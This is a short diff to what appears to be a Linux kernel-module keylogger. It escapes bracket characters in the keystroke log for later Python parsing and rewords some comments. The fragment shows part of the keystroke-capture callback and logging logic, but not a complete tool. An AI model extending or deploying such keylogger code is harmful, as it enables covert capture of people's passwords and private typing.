@@ -77,11 +77,15 @@ static void log_printable(unsigned int v)
     // ASCII space to ~
     if (c >= 0x20 && c <= 0x7E)
     {
+        if (c == '[' || c == ']') // for python to handle incase user types '[' / ']'
+        {
+            append_char('\\'); // take the actual "\" (not the special escape \ (\n)) and append char as "\[" or "\]"
+        }
         append_char(c);
     }
 }
 
-// Handle special/action keys based on KEY_* keycodes (pre kernel translation)
+// Handle special/action keys based on keycodes (pre kernel translation)
 static void log_special_key(unsigned int keycode)
 {
     switch (keycode)
@@ -137,7 +141,7 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
 
         case KBD_UNICODE:
         case KBD_KEYSYM:
-            log_printable(param->value); // text: uses same logic for both
+            log_printable(param->value); // text - same logic for both
             break;
     }
 
